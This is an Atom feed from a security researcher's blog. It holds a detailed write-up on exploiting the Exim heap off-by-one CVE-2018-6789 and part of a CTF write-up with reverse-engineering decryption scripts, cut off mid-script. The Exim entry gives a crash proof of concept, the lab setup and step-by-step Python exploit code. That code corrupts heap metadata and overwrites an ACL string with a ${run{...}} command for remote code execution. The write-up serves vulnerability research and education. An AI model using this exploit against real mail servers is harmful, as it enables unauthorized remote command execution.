<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>skysider&#39;s blog</title>
  
  <subtitle>追求文艺的安全研究员</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://skysider.github.io/"/>
  <updated>2018-05-11T17:47:32.497Z</updated>
  <id>https://skysider.github.io/</id>
  
  <author>
    <name>Skysider</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Exim off-by-one 漏洞利用</title>
    <link href="https://skysider.github.io/2018/05/12/Exim-off-by-one-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://skysider.github.io/2018/05/12/Exim-off-by-one-漏洞利用/</id>
    <published>2018-05-11T17:18:59.000Z</published>
    <updated>2018-05-11T17:47:32.497Z</updated>
    
    <content type="html"><![CDATA[<p>2018年2月，流行的邮件服务器Exim曝出了堆溢出漏洞（CVE-2018-6789），几乎影响了之前的所有版本。该漏洞的发现者——台湾安全研究员Meh在博客上提供了利用该漏洞进行远程代码执行的思路，在推特中也表明了最终绕过各种缓解措施成功达成远程代码执行。</p><p><img src="https://i.loli.net/2018/05/12/5af5cfacad3c5.png" alt="msg.png"></p><p>基于Meh的思路在特定环境下复现了漏洞利用的过程，最终达成远程命令执行，相关的<a href="https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789" target="_blank" rel="noopener">漏洞环境和验证代码</a> （<a href="https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789）已公开。" target="_blank" rel="noopener">https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789）已公开。</a></p><h3 id="1-漏洞成因"><a href="#1-漏洞成因" class="headerlink" title="1. 漏洞成因"></a>1. 漏洞成因</h3><p>漏洞的成因是b64decode函数在对不规范的base64编码过的数据进行解码时可能会溢出堆上的一个字节，比较经典的off-by-one漏洞。</p><p>存在漏洞的b64decode函数部分代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b64decode(<span class="keyword">const</span> uschar *code, uschar **ptr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line">uschar *result = store_get(<span class="number">3</span>*(Ustrlen(code)/<span class="number">4</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">*ptr = result;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each cycle of the loop handles a quantum of 4 input bytes. For the last</span></span><br><span class="line"><span class="comment">quantum this may decode to 1, 2, or 3 output bytes. */</span></span><br><span class="line"> ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码解码base64的逻辑是把4个字节当做一组，4个字节解码成3个字节，但是当最后余3个字节（即len(code)=<code>4n+3</code>）时，会解码成2个字节，解码后的总长度为 <code>3n+2</code> 字节，而分配的堆空间的大小为<code>3n+1</code> ，因此就会发生堆溢出。当然，官方给出的修补方案也很简单，多分配几个字节就可以了。</p><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h3><p>Meh博客中漏洞测试的exim版本是直接通过apt安装的，但是由于debian官方已经修复了仓库中exim的漏洞，可以通过查看软件包源码的patch信息确认：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@skysider:~/poc/exim4-4.86.2# apt-get source exim4</span><br><span class="line">......</span><br><span class="line">dpkg-source: info: applying 93_CVE-2017-1000368.patch</span><br><span class="line">dpkg-source: info: applying fix_smtp_banner.patch</span><br><span class="line">dpkg-source: info: applying CVE-2016-9963.patch</span><br><span class="line">dpkg-source: info: applying CVE-2018-6789.patch</span><br></pre></td></tr></table></figure><p>我们选择下载早期版本的源代码进行编译安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get build-dep exim4</span><br><span class="line">wget https://github.com/Exim/exim/releases/download/exim-4_89/exim-4.89.tar.xz</span><br></pre></td></tr></table></figure><p>在编译过程中要安装一些依赖库，还需要修改Makefile、新建用户、配置日志文件的权限等，可以参考<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/Dockerfile" target="_blank" rel="noopener">Dockerfile</a>（<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/Dockerfile）的安装过程。" target="_blank" rel="noopener">https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/Dockerfile）的安装过程。</a></p><p>exim可以在运行时指定配置文件，为了触发漏洞以及命令执行，需要配置CRAM-MD5 authenticator以及设置acl_smtp_mail等，配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">acl_smtp_mail=acl_check_mail</span><br><span class="line">acl_smtp_data=acl_check_data</span><br><span class="line">begin acl</span><br><span class="line">acl_check_mail:</span><br><span class="line">  .ifdef CHECK_MAIL_HELO_ISSUED</span><br><span class="line">  deny</span><br><span class="line">    message = no HELO given before MAIL command</span><br><span class="line">    condition = $&#123;if def:sender_helo_name &#123;no&#125;&#123;yes&#125;&#125;</span><br><span class="line">  .endif</span><br><span class="line"></span><br><span class="line">  accept</span><br><span class="line"></span><br><span class="line">acl_check_data:</span><br><span class="line">  accept</span><br><span class="line"></span><br><span class="line">begin authenticators</span><br><span class="line">fixed_cram:</span><br><span class="line">  driver = cram_md5</span><br><span class="line">  public_name = CRAM-MD5</span><br><span class="line">  server_secret = $&#123;if eq&#123;$auth1&#125;&#123;ph10&#125;&#123;secret&#125;fail&#125;</span><br><span class="line">  server_set_id = $auth1</span><br></pre></td></tr></table></figure><p>以调试模式启动exim服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim -bd -d-receive -C conf.conf</span><br></pre></td></tr></table></figure><p>也可以直接使用docker来验证该漏洞（上面的命令为默认启动命令）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name exim -p 25:25 skysider/vulndocker:cve-2018-6789</span><br></pre></td></tr></table></figure><h3 id="3-漏洞测试"><a href="#3-漏洞测试" class="headerlink" title="3. 漏洞测试"></a>3. 漏洞测试</h3><p>我们使用一个简单的poc来触发漏洞，poc代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import smtplib</span><br><span class="line">from base64 import b64encode</span><br><span class="line"></span><br><span class="line">print &quot;this poc is tested in exim 4.89 x64 bit with cram-md5 authenticators&quot;</span><br><span class="line">ip_address = raw_input(&quot;input ip address: &quot;)</span><br><span class="line">s = smtplib.SMTP(ip_address)</span><br><span class="line">#s.set_debuglevel(1)</span><br><span class="line"># 1. put a huge chunk into unsorted bin</span><br><span class="line">s.ehlo(&quot;mmmm&quot;+&quot;b&quot;*0x1500) # 0x2020</span><br><span class="line"></span><br><span class="line"># 2. send base64 data and trigger off-by-one</span><br><span class="line">#raw_input(&quot;overwrite one byte of next chunk&quot;)</span><br><span class="line">s.docmd(&quot;AUTH CRAM-MD5&quot;)</span><br><span class="line"></span><br><span class="line">payload = &quot;d&quot;*(0x2008-1)</span><br><span class="line">try:</span><br><span class="line">s.docmd(b64encode(payload)+b64encode(&apos;\xf1\xf1&apos;)[:-1])</span><br><span class="line">s.quit()</span><br><span class="line">except smtplib.SMTPServerDisconnected:</span><br><span class="line">print &quot;[!] exim server seems to be vulnerable to CVE-2018-6789.&quot;</span><br></pre></td></tr></table></figure><p>当执行这段代码时，会触发内存错误</p><p><img src="https://i.loli.net/2018/05/12/5af5cd9548163.png" alt="core_dump.png"></p><p>在这个过程中，堆的主要变化如下：</p><p><img src="https://i.loli.net/2018/05/12/5af5cfac95fe6.png" alt="poc.png"></p><p>我们可以去观察错误之前的堆，attach到子进程，下图是发送ehlo消息之后的堆：</p><p><img src="https://i.loli.net/2018/05/12/5af5cee2d053c.png" alt="heap_1.png"></p><p>发送Auth数据之后，我们可以看一下执行完b64decode函数之后的堆：</p><p><img src="https://i.loli.net/2018/05/12/5af5cee2e5ee3.png" alt="heap_2.png"></p><p>图中圈出来的两个字节正是我们发送的Auth数据解码出来的最后两个字节，最后一个字节0xf1修改了下一个块的大小，使得原本应该是0x4040（0x6060-0x2020）的unsorted 空闲块变成了0x40f0，通过查看该空闲块紧邻的下一个堆块可以确认当前unsorted bin的空闲块大小是被修改了，因此当从该空闲块分配空间时，malloc函数会检查该空闲块的大小 <code>0x40f0</code>  (低字节的低3位是标志位）与紧邻的下一个堆块标记的前一个堆块的大小 <code>0x4040</code> 是否相等，若不相等，就会触发内存错误。</p><h3 id="4-exim内存管理机制"><a href="#4-Exim内存管理机制" class="headerlink" title="4. Exim内存管理机制"></a>4. Exim内存管理机制</h3><p>exim在libc提供的堆管理机制的基础上实现了一套自己的管理堆块的方法，引入了store pool、store block的概念。store pool是一个单链表结构，每一个节点都是一个store block，每个store block的数据大小至少为0x2000，storeblock的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* Structure describing the beginning of each big block. */</span><br><span class="line"></span><br><span class="line">typedef struct storeblock &#123;</span><br><span class="line">  struct storeblock *next;</span><br><span class="line">  size_t length;</span><br><span class="line">&#125; storeblock;</span><br></pre></td></tr></table></figure><p>下图展示了一个storepool的完整的数据存储方式，chainbase是头结点，指向第一个storeblock，current_block是尾节点，指向链表中的最后一个节点。store_last_get指向current_block中最后分配的空间，next_yield指向下一次要分配空间时的起始位置，yield_length则表示当前store_block中剩余的可分配字节数。当current_block中的剩余字节数（yield_length）小于请求分配的字节数时，会调用malloc分配一个新的storeblock块，然后从该storeblock中分配需要的空间。更多关于exim内存管理机制可以查看<a href="https://github.com/Exim/exim/blob/master/src/src/store.c" target="_blank" rel="noopener">store.c</a>。</p><p><img src="https://i.loli.net/2018/05/12/5af5cfaca940f.png" alt="store.png"></p><h3 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5. 漏洞利用"></a>5. 漏洞利用</h3><p>整体的漏洞利用思路参考漏洞发现者Meh的博客，通过覆盖acl字符串为 <code>${run{command}}</code> 的方式，达到远程命令执行的目的。因为不同的配置和启动参数可能会导致exim服务在启动运行过程中堆栈布局存在差异，因此漏洞利用脚本仅在给定的环境中测试生效。</p><p>下面是漏洞利用的详细步骤：</p><p><img src="https://i.loli.net/2018/05/12/5af5cd954900f.png" alt="exp1.png"></p><ol><li>发送ehlo，布局堆空间</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ehlo(s, <span class="string">"a"</span>*<span class="number">0x1000</span>) <span class="comment"># 0x2020</span></span><br><span class="line">ehlo(s, <span class="string">"a"</span>*<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><p>   形成一块大小为0x7040的空闲堆块</p><ol start="2"><li>发送unknown command（包含不可打印字符）从unsorted bin分配内存空间</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docmd(s, <span class="string">"\xee"</span>*<span class="number">0x700</span>)</span><br></pre></td></tr></table></figure><p>发送的unknown command 的大小要满足 <code>yield_length &lt; (length + nonprintcount * 3 + 1)</code>  ，从而使得发送的unknown command能够调用malloc函数分配一个新的storeblock。</p><p><img src="https://i.loli.net/2018/05/12/5af5cd9549657.png" alt="exp2.png"></p><ol start="3"><li>发送ehlo信息回收unknown命令分配的空间</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ehlo(s, <span class="string">"c"</span>*<span class="number">0x2c00</span>)</span><br></pre></td></tr></table></figure><p>在回收unknown command占用的内存空间时，由于之前的sender_host_name占用的内存空间已经释放，会发生合并，形成大小为0x2050的空闲块</p><ol start="4"><li>发送Auth数据，触发漏洞，修改ehlo信息所在堆块的大小</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"d"</span>*(<span class="number">0x2020</span>+<span class="number">0x30</span><span class="number">-0x18</span><span class="number">-1</span>)</span><br><span class="line">docmd(s, b64encode(payload)+b64encode(<span class="string">"\xf1\xf1"</span>)[:<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><ol start="5"><li>发送Auth数据伪造下一个块的块头信息，绕过释放sender_host_name所在堆块时的内存检查</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">'m'</span>*<span class="number">0x70</span>+p64(<span class="number">0x1f41</span>) <span class="comment"># modify fake size</span></span><br><span class="line">docmd(s, b64encode(payload2))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/05/12/5af5cd9549405.png" alt="exp3.png"></p><ol start="6"><li>释放sender_host_name所在堆块，同时为了不释放其他storeblock，发送包含无效字符的信息</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ehlo(s, <span class="string">"skysider+"</span>)</span><br></pre></td></tr></table></figure><ol start="7"><li>发送Auth数据，修改overlapped所在storeblock的next指针，令其指向acl字符串所在的storeblock</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x2bf0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x2021</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">try_addr = p16(try_addr*<span class="number">0x10</span>+<span class="number">4</span>)  <span class="comment"># to change</span></span><br><span class="line">docmd(s, b64encode(payload3)+b64encode(try_addr)[:<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><p>由于地址随机化，acl所在的storeblock高位字节未知（在docker环境下，低12bit为0x480不变），但是原始的next指针指向的storeblock与要修改的storeblock高位字节相同，仅低位3字节不同，因此可以采用局部overwrite，只需要爆破12bit即可。</p><ol start="8"><li>发送ehlo消息释放所有的storeblock</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ehlo(s, &quot;released&quot;)</span><br></pre></td></tr></table></figure><p>此时unsorted bin表中存在多个空闲块，如下图所示，其中框出来的空闲块就是包含acl的storeblock</p><p><img src="https://i.loli.net/2018/05/12/5af5cd9525b77.png" alt="attach.png"></p><ol start="9"><li>覆盖acl字符串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload4 = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0xb1</span>) + <span class="string">'t'</span>*(<span class="number">0xb0</span><span class="number">-0x10</span>) + p64(<span class="number">0xb0</span>) + p64(<span class="number">0x1f40</span>)</span><br><span class="line">payload4 += <span class="string">'t'</span>*(<span class="number">0x1f80</span>-len(payload4))</span><br><span class="line">auth(s, b64encode(payload4)+<span class="string">'ee'</span>)</span><br><span class="line">payload5 = <span class="string">"a"</span>*<span class="number">0x78</span> + <span class="string">"$&#123;run&#123;"</span> + command + <span class="string">"&#125;&#125;\x00"</span></span><br><span class="line">auth(s, b64encode(payload5)+<span class="string">"ee"</span>)</span><br></pre></td></tr></table></figure><p>发送第一个auth消息之后，unsorted bin表如下图所示</p><p><img src="https://i.loli.net/2018/05/12/5af5cd9525b76.png" alt="attach2.png"></p><p>接着再分配合适的空间时，就可以获取目标storeblock所在的堆块，覆盖其中的acl字符串</p><p><img src="https://i.loli.net/2018/05/12/5af5cee2e888e.png" alt="heap_9.png"></p><ol start="10"><li>触发acl检查</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.sendline(&quot;MAIL FROM: &lt;test@163.com&gt;&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/05/12/5af5cd953d208.png" alt="exec.png"></p><p><img src="https://i.loli.net/2018/05/12/5af5cd953d3c5.png" alt="execute.png"></p><p>至此就可以远程执行命令，完整的漏洞利用脚本见<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py" target="_blank" rel="noopener">exp.py</a> （<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py），效果如下：" target="_blank" rel="noopener">https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py），效果如下：</a></p><p><img src="https://i.loli.net/2018/05/12/5af5cee2c4e0d.png" alt="final.png"></p><p><strong>注</strong>：该漏洞利用脚本仅用于交流学习与安全研究，请勿用于非法用途。</p><h3 id="参考"><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul><li><a href="https://www.exim.org/exim-html-current/doc/html/spec_html/ch-access_control_lists.html" target="_blank" rel="noopener">https://www.exim.org/exim-html-current/doc/html/spec_html/ch-access_control_lists.html</a></li><li><a href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/" target="_blank" rel="noopener">https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</a></li><li><a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/" target="_blank" rel="noopener">https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2018年2月，流行的邮件服务器Exim曝出了堆溢出漏洞（CVE-2018-6789），几乎影响了之前的所有版本。该漏洞的发现者——台湾安全研究员Meh在博客上提供了利用该漏洞进行远程代码执行的思路，在推特中也表明了最终绕过各种缓解措施成功达成远程代码执行。&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="exploit" scheme="https://skysider.github.io/categories/exploit/"/>
    
    
      <category term="cve-2018-6789" scheme="https://skysider.github.io/tags/cve-2018-6789/"/>
    
      <category term="off-by-one" scheme="https://skysider.github.io/tags/off-by-one/"/>
    
  </entry>
  
  <entry>
    <title>红帽杯2018部分writeup</title>
    <link href="https://skysider.github.io/2018/05/11/2018redhat/"/>
    <id>https://skysider.github.io/2018/05/11/2018redhat/</id>
    <published>2018-05-10T17:05:15.000Z</published>
    <updated>2018-05-12T04:11:15.870Z</updated>
    
    <content type="html"><![CDATA[<p>熬了一天，感觉pwn和re的水平退步不少。</p><h3 id="pwn"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>这次比赛中的pwn的题目难度一般，3个pwn分别涉及到</p><ul><li>栈溢出 ——game server</li><li>null byte offset-by-one —— shellcode manager</li><li>格式化串漏洞 —— Starcraft RPG</li></ul><p>中间在漏洞利用过程中也踩到了一些坑（可能是长期没打没有手感，有时间会整理一下）。</p><h3 id="re"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>re只看了最简单的icm，感觉自己re方面真是非常菜，赛后重新整理了getFlag的脚本，进行了简化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">    pip install cryptography</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipherAlgorithm</span><span class="params">(key, mode)</span>:</span></span><br><span class="line">    backend = default_backend()</span><br><span class="line">    cipher = Cipher(algorithms.IDEA(key), mode, backend=backend)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plainMsg, key, mode)</span>:</span></span><br><span class="line">    cipher = getCipherAlgorithm(key, mode)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    res = encryptor.update(plainMsg) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipherMsg, key, mode)</span>:</span></span><br><span class="line">    cipher = getCipherAlgorithm(key, mode)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    res = decryptor.update(cipherMsg) + decryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">    res = []</span><br><span class="line">    buf = <span class="string">""</span></span><br><span class="line">    libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line">    libc.srand(<span class="number">0x78C819C3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        buf += <span class="string">"&#123;:02x&#125;"</span>.format(libc.rand() % <span class="number">256</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipherText</span><span class="params">()</span>:</span></span><br><span class="line">    secret = [</span><br><span class="line">        <span class="number">0xd0</span>,  <span class="number">0xe0</span>,  <span class="number">0xab</span>,  <span class="number">0x9c</span>,  <span class="number">0xcd</span>,  <span class="number">0x78</span>,  <span class="number">0x5b</span>,  <span class="number">0x54</span>,</span><br><span class="line">        <span class="number">0x3d</span>,  <span class="number">0xe4</span>,  <span class="number">0xea</span>,  <span class="number">0x33</span>,  <span class="number">0x51</span>,  <span class="number">0x44</span>,  <span class="number">0x6d</span>,  <span class="number">0x3c</span>,</span><br><span class="line">        <span class="number">0x4e</span>,  <span class="number">0xce</span>,  <span class="number">0xdf</span>,  <span class="number">0xb5</span>,  <span class="number">0x41</span>,  <span class="number">0x0</span>,  <span class="number">0x1c</span>,  <span class="number">0xec</span>,</span><br><span class="line">        <span class="number">0xe3</span>,  <span class="number">0x1b</span>,  <span class="number">0xc3</span>,  <span class="number">0x8c</span>,  <span class="number">0x91</span>,  <span class="number">0x25</span>,  <span class="number">0x7f</span>,  <span class="number">0x1b</span>,</span><br><span class="line">        <span class="number">0x60</span>,  <span class="number">0xfe</span>,  <span class="number">0x35</span>,  <span class="number">0x9c</span>,  <span class="number">0xea</span>,  <span class="number">0x4</span>,  <span class="number">0x4c</span>,  <span class="number">0x87</span>,</span><br><span class="line">        <span class="number">0x8d</span>,  <span class="number">0x97</span>,  <span class="number">0x93</span>,  <span class="number">0x5c</span>,  <span class="number">0xb8</span>,  <span class="number">0x9a</span>,  <span class="number">0x70</span>,  <span class="number">0x75</span>,</span><br><span class="line">    ]</span><br><span class="line">    buf = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret)):</span><br><span class="line">        secret[i] = (<span class="number">119</span>-i) ^ secret[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret)):</span><br><span class="line">        secret[i] = secret[i] ^ (<span class="number">8</span> - i%<span class="number">8</span>)</span><br><span class="line">        buf += <span class="string">"&#123;:02x&#125;"</span>.format(secret[i]).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></span><br><span class="line">    cipherText = getCipherText()</span><br><span class="line">    key = getKey()</span><br><span class="line">    mode = modes.ECB()</span><br><span class="line">    msg = decrypt(cipherText, key, mode)</span><br><span class="line">    <span class="keyword">print</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    getFlag()</span><br></pre></td></tr></table></figure><p>wcm解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SM4 from https://github.com/yixiangzhike/AlgorithmSM</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> SM4 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span><span class="params">()</span>:</span></span><br><span class="line">    key = <span class="string">""</span></span><br><span class="line">    libc = cdll.msvcrt</span><br><span class="line">    libc.srand(<span class="number">0x2872DD1B</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        key += <span class="string">"&#123;:02x&#125;"</span>.format(libc.rand() % <span class="number">256</span>)</span><br><span class="line">    <span class="keyword">return</span> key.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipherText</span><span class="params">()</span>:</span></span><br><span class="line">    secret = [</span><br><span class="line">        <span class="number">0xf4</span>,  <span class="number">0x88</span>,  <span class="number">0x91</span>,  <span class="number">0xc2</span>,  <span class="number">0x9b</span>,  <span class="number">0x20</span>,  <span class="number">0x5b</span>,  <span class="number">0x3</span>,</span><br><span class="line">        <span class="number">0xf1</span>,  <span class="number">0xed</span>,  <span class="number">0xf6</span>,  <span class="number">0x13</span>,  <span class="number">0x46</span>,  <span class="number">0x3c</span>,  <span 